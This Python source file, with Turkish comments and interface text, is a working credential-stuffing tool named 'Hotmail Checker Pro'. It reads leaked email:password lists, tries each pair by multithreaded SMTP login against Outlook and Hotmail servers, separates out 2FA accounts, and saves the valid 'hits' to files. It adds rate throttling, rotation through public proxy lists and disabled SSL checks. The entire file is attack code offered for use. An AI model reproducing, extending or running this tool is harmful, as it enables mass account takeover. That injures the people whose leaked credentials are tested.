# -*- coding: utf-8 -*-
import os
import threading
import time
from queue import Queue
import smtplib
import socket
import re
import tkinter as tk
from tkinter import filedialog, simpledialog, messagebox, scrolledtext, ttk
import requests
from itertools import cycle
from colorama import init, Fore, Back, Style
import json
from datetime import datetime
import hashlib
import ssl
import urllib3
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.ssl_ import create_urllib3_context

# SSL uyarılarını kapat
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Özel SSL bağdaştırıcısı
class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

# Colorama'yı başlat
init(autoreset=True)

# Çeviri fonksiyonu
def translate(key):
    # Türkçe çeviri sözlüğü
    translations = {
        "current_speed": "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n┃          Mevcut Hız Modu: {speed_mode}          ┃\n┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫",
        "proxy_count": "🔌 Proxy sayısı: {count}",
        "menu": "\n" + Fore.YELLOW + "╔══════════════════════════════════════════════╗\n" +
                Fore.YELLOW + "║" + Fore.CYAN + "               ANA MENÜ " + Fore.YELLOW + "                 ║\n" +
                Fore.YELLOW + "╠══════════════════════════════════════════════╣\n" +
                Fore.YELLOW + "║ " + Fore.WHITE + "1. Taramayı Başlat" + Fore.YELLOW + "                       ║\n" +
                Fore.YELLOW + "║ " + Fore.WHITE + "2. Proxy Aç/Kapat" + Fore.YELLOW + "                        ║\n" +
                Fore.YELLOW + "║ " + Fore.WHITE + "3. GitHub'dan Proxy Yükle" + Fore.YELLOW + "                ║\n" +
                Fore.YELLOW + "║ " + Fore.WHITE + "4. Proxy Ayarları" + Fore.YELLOW + "                        ║\n" +
                Fore.YELLOW + "║ " + Fore.WHITE + "5. Hız Ayarları" + Fore.YELLOW + "                          ║\n" +
                Fore.YELLOW + "║ " + Fore.WHITE + "6. Genel Ayarlar" + Fore.YELLOW + "                         ║\n" +
                Fore.YELLOW + "║ " + Fore.WHITE + "7. Son Dosyayı Tekrar Yükle" + Fore.YELLOW + "              ║\n" +
                Fore.YELLOW + "║ " + Fore.WHITE + "8. Çıkış" + Fore.YELLOW + "                                 ║\n" +
                Fore.YELLOW + "╚══════════════════════════════════════════════╝" + Style.RESET_ALL,
        "select_file_title": "Hesap dosyasını seçin",
        "max_accounts": f"{Fore.YELLOW}Uyarı: Dosya çok büyük! İlk {DEFAULT_CONFIG['MAX_ACCOUNTS_PER_RUN']} hesap yüklenecek.{Style.RESET_ALL}",
        "checking": f"{Fore.GREEN}Taramaya başlanıyor...{Style.RESET_ALL}",
        "stop_checking": "Taramayı durdurmak için Ctrl+C'ye basın...",
        "checking_stopped": "Tarama kullanıcı tarafından durduruldu!",
        "done": f"{Fore.GREEN}Tarama tamamlandı!{Style.RESET_ALL}",
        "valid": f"{Fore.GREEN}Geçerli hesaplar:{Style.RESET_ALL}",
        "invalid": f"{Fore.RED}Geçersiz hesaplar:{Style.RESET_ALL}",
        "total_time": "Toplam süre: ",
        "proxy_loading": "Proxy'ler GitHub'dan yükleniyor...",
        "proxy_loaded": "Toplam {count} proxy yüklendi!",
        "proxy_error": "Proxy yüklenirken hata: {url}",
        "no_proxies": "Yüklü proxy bulunamadı!",
        "proxy_test": "Proxy'ler test ediliyor...",
        "proxy_test_result": "Test tamamlandı! {working_count}/{total_count} proxy çalışıyor.",
        "manual_proxy_add": "Manuel Proxy Ekleme",
        "enter_custom_proxies": "Lütfen proxy'leri her satıra bir tane olacak şekilde girin:",
        "proxy_added": "Proxy eklendi: {proxy}",
        "proxy_list": "Mevcut Proxy Listesi:",
        "proxy_cleared": "Proxy listesi temizlendi!",
        "proxy_types": "\nProxy Türü Seç:\n1. SOCKS5\n2. SOCKS4\n3. HTTP\n4. Tümü (SOCKS5 + SOCKS4 + HTTP)\nSeçiminiz: ",
        "invalid_choice": f"{Fore.RED}Geçersiz seçim!{Style.RESET_ALL}",
        "speed_menu": "\nHız Ayarları:\n1. Yavaş Mod (2s bekleme)\n2. Orta Mod (1s bekleme)\n3. Hızlı Mod (0.5s bekleme)\nSeçiminiz: ",
        "speed_changed": "Hız modu değiştirildi: ",
        "settings_menu": "\nGenel Ayarlar:\n1. Maksimum Hesap Sayısını Ayarla\n2. İş Parçacığı Sayısını Ayarla\n3. Otomatik Kaydetmeyi Aç/Kapat\n4. Geri\nSeçiminiz: ",
        "enter_max_accounts": "Maksimum hesap sayısını girin (1-10000): ",
        "enter_thread_count": "İş parçacığı sayısını girin (1-20): ",
        "auto_save_status": "Otomatik kaydetme: {status}",
        "reload_last_file": "Son dosya yeniden yükleniyor: {file}",
        "no_last_file": "Son kullanılan dosya bulunamadı!"
    }
    return translations.get(key, f"{key} çevirisi bulunamadı")

# Varsayılan ayarlar
DEFAULT_CONFIG = {
    "MAX_ACCOUNTS_PER_RUN": 10000,
    "THREAD_COUNT": 5,
    "LANG": "TR",
    "REQUEST_DELAY": 2,
    "CURRENT_SPEED_MODE": "Yavas mod",
    "current_proxies": [],
    "proxy_type": "all",
    "use_proxy": False,
    "last_file_path": "",
    "auto_save": True,
    "current_proxy_index": 0,
    "show_menu": False  # Menü gösterimini kontrol etmek için yeni ayar
}

# Proxy listelerini indirecek URL'ler
PROXY_URLS = {
    "socks5": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "socks4": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
    "http": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
}

# Config dosyası
CONFIG_FILE = "hotmail_checker_config.json"

# Global değişkenler
config = DEFAULT_CONFIG.copy()
proxy_cycle = None
is_checking = False
stop_requested = False
start_time = 0
counters = {"valid": 0, "invalid": 0, "2fa": 0, "retry": 0}

def load_config():
    global config
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                loaded_config = json.load(f)
                config.update(loaded_config)
            return True
        else:
            save_config()
            return True
    except Exception as e:
        print(f"{Fore.RED}Ayar dosyasi yuklenirken hata: {e}{Style.RESET_ALL}")
        return False

def save_config():
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=4)
        return True
    except Exception as e:
        print(f"{Fore.RED}Ayar dosyasi kaydedilirken hata: {e}{Style.RESET_ALL}")
        return False

def print_banner():
    """Renkli banner yazdir"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.CYAN}╔{'═'*60}╗")
    print(f"{Fore.CYAN}║{Fore.YELLOW}           HOTMAIL CHECKER PRO v3.0 {Fore.CYAN}          ║")
    print(f"{Fore.CYAN}║{Fore.WHITE}         Yavas ve Dikkatli Tarama Modu {Fore.CYAN}        ║")
    print(f"{Fore.CYAN}╚{'═'*60}╝{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✦ {Fore.YELLOW}Yavas tarama ile daha cok hit bulunur {Fore.GREEN}✦{Style.RESET_ALL}")
    print(f"{Fore.CYAN}━{'━'*60}━{Style.RESET_ALL}")
    print(translate("current_speed").format(speed_mode=config['CURRENT_SPEED_MODE']))
    print(translate("proxy_count").format(count=len(config['current_proxies'])))
    
    # Proxy durumunu daha belirgin göster
    if config['use_proxy']:
        print(f"{Fore.GREEN}🔌 Proxy kullanimi: ACIK{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 Proxy turu: {config['proxy_type'].upper()}{Style.RESET_ALL}")
        if config['current_proxies']:
            current_proxy = config['current_proxies'][config.get('current_proxy_index', 0) % len(config['current_proxies'])]
            print(f"{Fore.CYAN}🌐 Aktif proxy: {current_proxy}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}🔌 Proxy kullanimi: KAPALI{Style.RESET_ALL}")
    
    if config['last_file_path'] and os.path.exists(config['last_file_path']):
        file_name = os.path.basename(config['last_file_path'])
        print(f"📁 Son dosya: {file_name}")
    
    # Menüyü göster veya gizle
    if config['show_menu']:
        print(translate("menu"))

def toggle_menu():
    """Menü gösterimini aç/kapa"""
    config['show_menu'] = not config['show_menu']
    save_config()
    print_banner()

def select_file_dialog():
    """Dosya secme penceresi ac"""
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    
    file_path = filedialog.askopenfilename(
        title=translate("select_file_title"),
        filetypes=[
            ("Text files", "*.txt"),
            ("All files", "*.*")
        ]
    )
    root.destroy()
    
    if file_path:
        config['last_file_path'] = file_path
        save_config()
    
    return file_path

def get_accounts_from_file(file_path):
    if not file_path:
        return []
    
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            accounts = [line.strip() for line in f if line.strip() and ":" in line]
        
        if len(accounts) > config['MAX_ACCOUNTS_PER_RUN']:
            print(translate("max_accounts"))
            return accounts[:config['MAX_ACCOUNTS_PER_RUN']]
        return accounts
    except Exception as e:
        print(f"Dosya okuma hatasi: {e}")
        return []

def is_valid_email_format(email):
    """Email formatini kontrol et"""
    pattern = r'^[a-zA-Z0-9._%+-]+@(outlook|hotmail|live)\.(com|tr|org|net|edu)$'
    return re.match(pattern, email) is not None

def check_smtp_connection(email, password):
    """Yavas ve dikkatli SMTP baglantisi kontrolu"""
    try:
        # Outlook/Hotmail SMTP sunuculari
        smtp_servers = [
            ('smtp-mail.outlook.com', 587),
            ('smtp.live.com', 587),
            ('smtp.office365.com', 587),
            ('smtp.outlook.com', 587),
        ]
        
        for server, port in smtp_servers:
            try:
                if stop_requested:
                    return False, "stopped"
                    
                # Daha uzun timeout sureleri
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((server, port))
                sock.close()
                
                # SMTP baglantisi - daha yavas ve dikkatli
                with smtplib.SMTP(server, port, timeout=20) as smtp:
                    time.sleep(1)
                    smtp.ehlo()
                    time.sleep(0.5)
                    smtp.starttls()
                    time.sleep(0.5)
                    smtp.ehlo()
                    time.sleep(0.5)
                    
                    try:
                        smtp.login(email, password)
                        return True, "valid"
                    except smtplib.SMTPAuthenticationError as e:
                        # 2FA kontrolu
                        if "two-factor" in str(e).lower() or "2fa" in str(e).lower():
                            return True, "2fa"
                        return False, "invalid"
                    except smtplib.SMTPException:
                        continue
                    except Exception:
                        continue
                        
            except (socket.timeout, ConnectionRefusedError, socket.gaierror, OSError):
                continue
            except Exception:
                continue
                
        return False, "invalid"
        
    except Exception:
        return False, "invalid"

def check_domain_connectivity(domain):
    """Basit domain erisilebilirlik kontrolu"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)
        result = sock.connect_ex((domain, 80))
        sock.close()
        return result == 0
    except:
        return False

def draw_progress_bar(percentage, width=40):
    """Ilerleme cubugu ciz"""
    filled = int(width * percentage / 100)
    empty = width - filled
    bar = "█" * filled + "░" * empty
    return bar

def worker(queue, hit_results_file, counters, lock):
    """Is parcacigi fonksiyonu - Yavas ve dikkatli"""
    while not queue.empty() and not stop_requested:
        account = queue.get()
        try:
            if stop_requested:
                queue.task_done()
                break
                
            email, password = account.split(":", 1)
            email = email.strip().lower()
            password = password.strip()
            
            if not email or not password:
                with lock:
                    counters["invalid"] += 1
                queue.task_done()
                continue
            
            if not is_valid_email_format(email):
                with lock:
                    counters["invalid"] += 1
                queue.task_done()
                continue
            
            domain = email.split('@')[1]
            if not check_domain_connectivity(domain):
                with lock:
                    counters["invalid"] += 1
                queue.task_done()
                continue
            
            is_valid, status = check_smtp_connection(email, password)
            
            with lock:
                if is_valid:
                    if status == "2fa":
                        counters["2fa"] += 1
                        with open(hit_results_file.replace(".txt", "_2fa.txt"), "a", encoding="utf-8") as f:
                            f.write(f"{email}:{password}\n")
                        print(f"{Fore.YELLOW}2FA HESAP: {email}{Style.RESET_ALL}")
                    else:
                        counters["valid"] += 1
                        with open(hit_results_file, "a", encoding="utf-8") as f:
                            f.write(f"{email}:{password}\n")
                        print(f"{Fore.GREEN}HIT BULUNDU: {email}{Style.RESET_ALL}")
                else:
                    counters["invalid"] += 1
                
            time.sleep(config['REQUEST_DELAY'])
                        
        except ValueError:
            with lock:
                counters["invalid"] += 1
        except Exception:
            with lock:
                counters["retry"] += 1
        finally:
            queue.task_done()

def check_accounts_multithread(accounts, hit_results_file):
    """Çoklu iş parçacığı ile yavaş hesap kontrolü"""
    global is_checking, stop_requested, start_time, counters
    
    # Ekranı temizle ve sadece ilerleme çubuğunu göster
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.CYAN}╔{'═'*60}╗")
    print(f"{Fore.CYAN}║{Fore.YELLOW}           HOTMAIL CHECKER PRO v3.0 {Fore.CYAN}          ║")
    print(f"{Fore.CYAN}║{Fore.WHITE}         Yavas ve Dikkatli Tarama Modu {Fore.CYAN}        ║")
    print(f"{Fore.CYAN}╚{'═'*60}╝{Style.RESET_ALL}")
    
    if not accounts:
        return

    is_checking = True
    stop_requested = False
    start_time = time.time()
    counters = {"valid": 0, "invalid": 0, "2fa": 0, "retry": 0}
    
    total_accounts = len(accounts)
    queue = Queue()
    for acc in accounts:
        queue.put(acc)

    lock = threading.Lock()

    with open(hit_results_file, "w", encoding="utf-8") as f:
        f.write(f"# Yavas Hotmail/Outlook Checker Sonuclari - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# TOPLAM HESAP: {total_accounts}\n\n")

    print(translate("checking"))
    print(f"{Fore.YELLOW}{config['CURRENT_SPEED_MODE']} aktif: Her hesap arasinda {config['REQUEST_DELAY']} saniye bekleniyor{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Durdurmak için Ctrl+C tuslarina basin{Style.RESET_ALL}")
    
    # Proxy bilgisini göster
    if config['use_proxy'] and config['current_proxies']:
        current_proxy = config['current_proxies'][config.get('current_proxy_index', 0) % len(config['current_proxies'])]
        print(f"{Fore.CYAN}🌐 Kullanilan proxy: {current_proxy}{Style.RESET_ALL}")
    
    threads = []
    for _ in range(min(config['THREAD_COUNT'], total_accounts)):
        t = threading.Thread(target=worker, args=(queue, hit_results_file, counters, lock))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while any(t.is_alive() for t in threads) and not stop_requested:
            processed = counters["valid"] + counters["invalid"] + counters["2fa"] + counters["retry"]
            progress_percent = round((processed / total_accounts) * 100, 2) if total_accounts > 0 else 0
            
            elapsed = time.time() - start_time
            minutes = elapsed / 60
            cpm = counters["valid"] / minutes if minutes > 0 else 0
            
            progress_bar = draw_progress_bar(progress_percent)
            
            print(f"Progress |{progress_bar}| {progress_percent}% Completed: {processed}/{total_accounts} | HIT: {counters['valid']} | 2FA: {counters['2fa']} | FAIL: {counters['invalid']} | CPM: {cpm:.1f}", end="\r")
            
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}{translate('stop_checking')}{Style.RESET_ALL}")
        stop_requested = True

    # Tüm thread'lerin bitmesini bekle
    for t in threads:
        t.join(timeout=5)

    total_time = time.time() - start_time
    
    if stop_requested:
        print(f"{Fore.YELLOW}{translate('checking_stopped')}{Style.RESET_ALL}")
    else:
        print(f"\n{translate('done')}")
    
    print(f"Toplam hesap: {total_accounts}")
    print(f"{translate('valid')}: {counters['valid']}")
    print(f"2FA Hesaplar: {counters['2fa']}")
    print(f"{translate('invalid')}: {counters['invalid']}")
    print(f"Tekrar Denenen: {counters['retry']}")
    print(f"{translate('total_time')}{total_time:.2f}s")
    
    if counters["valid"] > 0 and not stop_requested:
        hit_ratio = (counters["valid"] / total_accounts) * 100
        print(f"{Fore.GREEN}Hit orani: {hit_ratio:.2f}%{Style.RESET_ALL}")

    is_checking = False
    input(f"\n{Fore.YELLOW}Ana menüye donmek icin Enter tusuna basin...{Style.RESET_ALL}")

def load_proxies_from_github(proxy_type="all"):
    """GitHub'dan proxy listesi yukle"""
    print(f"{Fore.BLUE}{translate('proxy_loading')}{Style.RESET_ALL}")
    
    all_proxies = []
    
    try:
        # Özel SSL adapter ile session oluştur
        session = requests.Session()
        session.mount("https://", SSLAdapter())
        
        if proxy_type in ["all", "socks5"]:
            response = session.get(PROXY_URLS["socks5"], timeout=10, verify=False)
            socks5_proxies = [f"socks5://{line.strip()}" for line in response.text.splitlines() if line.strip()]
            all_proxies.extend(socks5_proxies)
            print(f"{Fore.GREEN}{len(socks5_proxies)} SOCKS5 proxy yuklendi{Style.RESET_ALL}")
        
        if proxy_type in ["all", "socks4"]:
            response = session.get(PROXY_URLS["socks4"], timeout=10, verify=False)
            socks4_proxies = [f"socks4://{line.strip()}" for line in response.text.splitlines() if line.strip()]
            all_proxies.extend(socks4_proxies)
            print(f"{Fore.BLUE}{len(socks4_proxies)} SOCKS4 proxy yuklendi{Style.RESET_ALL}")
        
        if proxy_type in ["all", "http"]:
            response = session.get(PROXY_URLS["http"], timeout=10, verify=False)
            http_proxies = [f"http://{line.strip()}" for line in response.text.splitlines() if line.strip()]
            all_proxies.extend(http_proxies)
            print(f"{Fore.YELLOW}{len(http_proxies)} HTTP proxy yuklendi{Style.RESET_ALL}")
        
        print(translate("proxy_loaded").format(count=len(all_proxies)))
        return all_proxies
    
    except Exception as e:
        print(translate("proxy_error").format(url=PROXY_URLS[proxy_type if proxy_type != "all" else "http"]))
        print(f"Hata detayi: {e}")
        return []

def test_proxies(proxies, test_url="http://httpbin.org/ip", timeout=5):
    """Proxy'leri test et"""
    if not proxies:
        print(translate("no_proxies"))
        return []
        
    print(translate("proxy_test"))
    working_proxies = []
    
    # Özel SSL adapter ile session oluştur
    session = requests.Session()
    session.mount("https://", SSLAdapter())
    
    for proxy in proxies:
        try:
            if stop_requested:
                break
                
            response = session.get(test_url, proxies={
                "http": proxy,
                "https": proxy
            }, timeout=timeout, verify=False)
            
            if response.status_code == 200:
                working_proxies.append(proxy)
                print(f"{proxy} - Calisiyor")
            else:
                print(f"{proxy} - Hata kodu: {response.status_code}")
        except Exception as e:
            print(f"{proxy} - Hata: {str(e)[:50]}")
    
    print(translate("proxy_test_result").format(
        working_count=len(working_proxies), 
        total_count=len(proxies)
    ))
    return working_proxies

def add_manual_proxy():
    """Kullanicidan manuel proxy ekle"""
    print(f"\n{Fore.CYAN}{translate('manual_proxy_add')}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{translate('enter_custom_proxies')}{Style.RESET_ALL}")
    
    root = tk.Tk()
    root.withdraw()
    
    proxy_text = simpledialog.askstring("Proxy Ekle", "Proxy'leri her satira bir tane olacak sekilde girin:\nOrnek: 192.168.1.1:8080\nveya http://192.168.1.1:8080\nveya socks5://192.168.1.1:1080")
    root.destroy()
    
    if proxy_text:
        new_proxies = []
        for line in proxy_text.split('\n'):
            line = line.strip()
            if line:
                # Proxy formatini duzelt
                if '://' not in line:
                    line = f"http://{line}"  # Varsayilan olarak HTTP
                new_proxies.append(line)
                print(translate("proxy_added").format(proxy=line))
        
        return new_proxies
    return []

def view_proxy_list():
    """Proxy listesini goruntule"""
    if not config['current_proxies']:
        print(translate("no_proxies"))
        return
        
    print(f"\n{Fore.CYAN}{translate('proxy_list')}{Style.RESET_ALL}")
    for i, proxy in enumerate(config['current_proxies'], 1):
        status = f"{Fore.GREEN}✓" if i <= 10 else ""
        print(f"{i}. {proxy} {status}")
    
    if len(config['current_proxies']) > 10:
        print(f"... ve {len(config['current_proxies']) - 10} proxy daha")

def clear_proxy_list():
    """Proxy listesi temizle"""
    config['current_proxies'] = []
    config['current_proxy_index'] = 0
    save_config()
    print(translate("proxy_cleared"))

def proxy_settings_menu():
    """Proxy ayarlari menusu"""
    while True:
        # Dinamik menu metni olustur
        proxy_menu_text = f"\n{Fore.BLUE}╔{'═'*50}╗\n{Fore.BLUE}║{Fore.CYAN}           PROXY AYARLARI {Fore.BLUE}          ║\n{Fore.BLUE}╠{'═'*50}╣\n{Fore.BLUE}║ {Fore.WHITE}1. Proxy Turu Sec ({config['proxy_type']}) {Fore.BLUE}      ║\n{Fore.BLUE}║ {Fore.WHITE}2. GitHub'dan Proxy Yukle {Fore.BLUE}           ║\n{Fore.BLUE}║ {Fore.WHITE}3. Manuel Proxy Ekle {Fore.BLUE}               ║\n{Fore.BLUE}║ {Fore.WHITE}4. Proxy Listesini Goruntule {Fore.BLUE}        ║\n{Fore.BLUE}║ {Fore.WHITE}5. Proxy Testi Yap {Fore.BLUE}                 ║\n{Fore.BLUE}║ {Fore.WHITE}6. Proxy Listesini Temizle {Fore.BLUE}          ║\n{Fore.BLUE}║ {Fore.WHITE}7. Geri {Fore.BLUE}                            ║\n{Fore.BLUE}╚{'═'*50}╝\n{Fore.YELLOW}Seciminiz: {Style.RESET_ALL}"
        
        choice = input(proxy_menu_text).strip()
        
        if choice == "1":
            type_choice = input(translate("proxy_types")).strip()
            if type_choice == "1":
                config['proxy_type'] = "socks5"
            elif type_choice == "2":
                config['proxy_type'] = "socks4"
            elif type_choice == "3":
                config['proxy_type'] = "http"
            elif type_choice == "4":
                config['proxy_type'] = "all"
            else:
                print(translate("invalid_choice"))
                continue
            
            save_config()
            print(f"Proxy turu degistirildi: {config['proxy_type']}")
            return True  # Ana menüye dön
            
        elif choice == "2":
            new_proxies = load_proxies_from_github(config['proxy_type'])
            config['current_proxies'].extend(new_proxies)
            config['current_proxies'] = list(set(config['current_proxies']))  # Tekilleri al
            save_config()
            print(f"Toplam {len(config['current_proxies'])} proxy")
            return True  # Ana menüye dön
            
        elif choice == "3":
            new_proxies = add_manual_proxy()
            config['current_proxies'].extend(new_proxies)
            config['current_proxies'] = list(set(config['current_proxies']))  # Tekilleri al
            save_config()
            print(f"Toplam {len(config['current_proxies'])} proxy")
            return True  # Ana menüye dön
            
        elif choice == "4":
            view_proxy_list()
            
        elif choice == "5":
            if config['current_proxies']:
                working_proxies = test_proxies(config['current_proxies'])
                # Calisan proxy'leri guncelle
                config['current_proxies'] = working_proxies
                save_config()
                print(f"{len(config['current_proxies'])} calisan proxy kaldi")
            else:
                print(translate("no_proxies"))
            
        elif choice == "6":
            clear_proxy_list()
            
        elif choice == "7":
            return True  # Ana menüye dön
            
        else:
            print(translate("invalid_choice"))

def speed_settings_menu():
    """Tarama hizi ayarlari menusu"""
    while True:
        choice = input(translate("speed_menu")).strip()
        
        if choice == "1":
            config['REQUEST_DELAY'] = 2
            config['THREAD_COUNT'] = 3
            config['CURRENT_SPEED_MODE'] = "Yavas mod"
            save_config()
            print(f"{translate('speed_changed')}{config['CURRENT_SPEED_MODE']}")
            return True
            
        elif choice == "2":
            config['REQUEST_DELAY'] = 1
            config['THREAD_COUNT'] = 5
            config['CURRENT_SPEED_MODE'] = "Orta mod"
            save_config()
            print(f"{translate('speed_changed')}{config['CURRENT_SPEED_MODE']}")
            return True
            
        elif choice == "3":
            config['REQUEST_DELAY'] = 0.5
            config['THREAD_COUNT'] = 8
            config['CURRENT_SPEED_MODE'] = "Hizli mod"
            save_config()
            print(f"{translate('speed_changed')}{config['CURRENT_SPEED_MODE']}")
            return True
            
        else:
            print(translate("invalid_choice"))

def settings_menu():
    """Ayarlar menusu"""
    while True:
        choice = input(translate("settings_menu")).strip()
        
        if choice == "1":
            try:
                new_max = int(input(translate("enter_max_accounts")))
                if 1 <= new_max <= 10000:
                    config['MAX_ACCOUNTS_PER_RUN'] = new_max
                    save_config()
                    print(f"Maksimum hesap sayisi: {new_max}")
                else:
                    print("Gecersiz deger! 1-10000 arasinda olmali.")
            except ValueError:
                print("Gecersiz sayi!")
                
        elif choice == "2":
            try:
                new_threads = int(input(translate("enter_thread_count")))
                if 1 <= new_threads <= 20:
                    config['THREAD_COUNT'] = new_threads
                    save_config()
                    print(f"Is parcacigi sayisi: {new_threads}")
                else:
                    print("Gecersiz deger! 1-20 arasinda olmali.")
            except ValueError:
                print("Gecersiz sayi!")
                
        elif choice == "3":
            config['auto_save'] = not config['auto_save']
            save_config()
            status = "ACIK" if config['auto_save'] else "KAPALI"
            print(translate("auto_save_status").format(status=status))
            
        elif choice == "4":
            return True
            
        else:
            print(translate("invalid_choice"))

def reload_last_file():
    """Son kullanilan dosyayi tekrar yukle"""
    if config['last_file_path'] and os.path.exists(config['last_file_path']):
        print(translate("reload_last_file").format(file=os.path.basename(config['last_file_path'])))
        return config['last_file_path']
    else:
        print(translate("no_last_file"))
        return None

def main():
    """Ana program"""
    global config
    
    # Ayarları yükle
    load_config()
    
    while True:
        print_banner()
        
        try:
            # Menü gösterilmiyorsa sadece temel bilgileri göster
            if not config['show_menu']:
                print(f"\n{Fore.YELLOW}M - Menuyu goster{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}C - Cikis{Style.RESET_ALL}")
                choice = input(f"{Fore.YELLOW}Seciminiz: {Style.RESET_ALL}").strip().lower()
            else:
                choice = input(f"{Fore.YELLOW}Seciminiz: {Style.RESET_ALL}").strip()
            
            if choice == "1" or choice == "baslat":
                print(f"{Fore.CYAN}Lutfen hesap dosyasini secin (email:password formatinda){Style.RESET_ALL}")
                file_path = select_file_dialog()
                
                if not file_path:
                    print(f"{Fore.RED}Dosya secilmedi veya bulunamadi.{Style.RESET_ALL}")
                    continue
                    
                if not os.path.exists(file_path):
                    print(f"{Fore.RED}Dosya secilmedi veya bulunamadi.{Style.RESET_ALL}")
                    continue
                    
                accounts = get_accounts_from_file(file_path)
                if not accounts:
                    continue
                    
                user_id = int(time.time())
                hit_results_file = f"tarama_sonuclar_{user_id}.txt"
                
                check_accounts_multithread(accounts, hit_results_file)
                print(f"{Fore.GREEN}Gecerli hesaplar '{hit_results_file}' dosyasina kaydedildi.{Style.RESET_ALL}")
                
            elif choice == "2" or choice == "proxy":
                config['use_proxy'] = not config['use_proxy']
                save_config()
                status = f"{Fore.GREEN}ACIK" if config['use_proxy'] else f"{Fore.RED}KAPALI"
                print(f"Proxy kullanimi: {status}{Style.RESET_ALL}")
                time.sleep(1)
                
            elif choice == "3" or choice == "github":
                new_proxies = load_proxies_from_github(config['proxy_type'])
                config['current_proxies'].extend(new_proxies)
                config['current_proxies'] = list(set(config['current_proxies']))  # Tekilleri al
                save_config()
                print(f"Toplam {len(config['current_proxies'])} proxy")
                
            elif choice == "4" or choice == "proxyayar":
                proxy_settings_menu()
                
            elif choice == "5" or choice == "hiz":
                speed_settings_menu()
                
            elif choice == "6" or choice == "ayar":
                settings_menu()
                
            elif choice == "7" or choice == "tekrar":
                file_path = reload_last_file()
                if file_path:
                    accounts = get_accounts_from_file(file_path)
                    if accounts:
                        user_id = int(time.time())
                        hit_results_file = f"tarama_sonuclar_{user_id}.txt"
                        check_accounts_multithread(accounts, hit_results_file)
                        print(f"{Fore.GREEN}Gecerli hesaplar '{hit_results_file}' dosyasina kaydedildi.{Style.RESET_ALL}")
                
            elif choice == "8" or choice == "cikis" or choice == "c":
                print(f"{Fore.RED}Cikis yapiliyor...{Style.RESET_ALL}")
                break
                
            elif choice == "m" or choice == "menu":
                toggle_menu()
                
            else:
                print(f"{Fore.RED}Gecersiz secim!{Style.RESET_ALL}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program kullanici tarafindan durduruldu.{Style.RESET_ALL}")
            break

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        print(f"{Fore.RED}Requests kutuphanesi gerekiyor. Yuklemek icin: pip install requests{Style.RESET_ALL}")
        exit(1)
        
    try:
        import colorama
    except ImportError:
        print(f"{Fore.RED}Colorama kutuphanesi gerekiyor. Yuklemek icin: pip install colorama{Style.RESET_ALL}")
        exit(1)
        
    main()
